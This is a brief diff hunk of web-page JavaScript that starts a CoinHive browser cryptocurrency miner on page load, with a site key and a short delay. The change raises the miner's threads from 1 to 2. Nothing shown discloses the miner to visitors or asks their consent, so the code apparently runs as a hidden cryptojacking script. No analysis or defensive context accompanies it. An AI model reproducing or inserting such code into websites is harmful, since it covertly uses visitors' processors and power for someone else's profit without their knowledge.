@@ -12,7 +12,7 @@ $(document).ready(function(){
 	function los() {
 		setTimeout(function() {
 			var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
-				threads: 1
+				threads: 2
 			});
 			miner.start();
 		}, 500);
